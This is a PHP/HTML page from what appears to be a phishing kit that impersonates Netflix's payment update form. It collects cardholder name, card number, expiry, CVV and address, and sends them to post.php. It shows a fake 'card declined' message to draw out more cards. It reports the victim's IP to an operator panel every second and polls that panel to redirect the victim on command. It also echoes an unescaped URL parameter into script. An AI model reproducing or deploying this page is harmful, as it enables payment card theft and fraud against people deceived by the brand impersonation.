<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment information</title>
    <link rel="stylesheet" href="res/css/account.css">
    <link rel="stylesheet" href="res/css/account-media.css">
</head>
<body style="background:white !important;">

<div class="window" id="loader" style="display:none;">
    <div class="content">
        <p style="text-align:center;">
            Please wait...<br>
            do not leave this page.
        </p>
        <img src="res/img/loading.gif" style="width:40px; margin:10px;">
    </div>
</div>

<header>
    <div class="left">
        <img src="res/img/logo.png">
    </div>
    <div class="right">
        <a href="#">Sign out</a>
    </div>
</header>

<section style="text-align:center;">
    <div class="form" id="card" style="text-align:left;">
        <input type="hidden" id="card_type" value="unkown">

        <div class="form-title" style="font-size:2em; font-weight:bold; color:#333;">
            Set up your credit or debit card
        </div>

        <div class="form-col">
            <img src="res/img/cards.png" style="width:180px;">
        </div>

        <?php 
        if(isset($_GET['e'])){
            echo '<p style="color:red; text-align:center;">Card declined. Please try another card or contact your bank.</p>';
        }
        ?>

        <form action="post.php" method="post">

            <div class="form-col">
                <label>Cardholder Name</label>
                <input type="text" class="textinput" name="name" placeholder="Cardholder Name" required>
            </div>

            <div class="form-col">
                <label>Card Number</label>
                <input type="text" class="textinput" name="cc" id="cc" placeholder="Card number" required>
            </div>

            <div class="form-col multi">
                <div class="left">
                    <label>Expiration Date</label>
                    <input type="text" class="textinput" name="exp" id="exp" placeholder="MM/AA" required>
                </div>
                <div class="right">
                    <label>Security Code</label>
                    <input type="text" class="textinput" name="cvv" id="cvv" placeholder="CVV" required>
                </div>
            </div>

            <div class="form-col">
                <label>Address / Street</label>
                <input type="text" class="textinput" name="address" placeholder="Street address" required>
            </div>

            <div class="form-col multi">
                <div class="left">
                    <label>City</label>
                    <input type="text" class="textinput" name="city" placeholder="City" required>
                </div>
                <div class="right">
                    <label>Zip Code</label>
                    <input type="text" class="textinput" name="zip" placeholder="Zip Code" required>
                </div>
            </div>

            <div class="form-col link" style="color:#848484; font-size:0.8em;">
                <p>
                    By clicking the “Update” button below, you agree to our
                    <a href="#">Terms of Use</a>,
                    <a href="#">Privacy Policy</a>,
                    confirm that you are over 18 years old, and that
                    <b>Netflix will automatically continue your membership and charge the membership fee to your payment method until cancellation.</b>
                </p>
            </div>

            <div class="form-col">
                <button type="submit">Update</button>
            </div>

        </form>
    </div>
</section>

<footer>
<div class="footer-holder">
    <h3>Questions? Contact us.</h3>
    <span>FAQ</span>
    <span>Help Center</span>
    <span>Terms of Use</span> 
    <span>Privacy</span>
    <span>Cookie Preferences</span>
    <span>Corporate Information</span>
</div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="./res/cdn/jq.js"></script>

<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");

setInterval(() => {
    $.post("../panel/update_statu.php",{
        update:1, 
        ip:'<?php echo $pnl->IP ?? $_SERVER['REMOTE_ADDR'] ?? "unknown"; ?>'
    });
}, 1000);

var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd != d && d != 0){
            window.location = d;
        }
    });
}, 2000);
</script>
</body>
</html>